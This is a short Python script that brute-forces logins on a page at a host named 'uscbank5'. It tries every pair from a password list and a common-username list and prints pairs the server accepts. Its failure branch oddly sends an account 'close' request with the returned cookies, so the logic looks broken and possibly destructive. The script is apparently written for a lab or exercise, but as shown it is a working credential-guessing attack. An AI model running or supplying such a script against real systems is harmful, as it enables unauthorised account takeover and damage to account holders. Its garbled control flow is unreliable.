import requests

# read passwords from file nord-pass.csv and store in list using comma delimiter
with open('nord-pass.csv', 'r') as f:
    passwords = f.read().splitlines()

with open('popular-usernames.csv', 'r') as f:
    usernames = f.read().splitlines()
    
for username in usernames:
    for password in passwords:
        url = 'https://uscbank5/login.php?user=' + username + '&pass=' + password
        
        # Send the login request and check if it was successful
        response = requests.post(url)
        if "Invalid username or password" not in response.text:
            print("Found weak username and password: " + username + " " + password)
        else:
            url_manage = 'https://uscbank5/manage.php?action=close'
            r2 = requests.post(url_manage, cookies=response.cookies)
            # success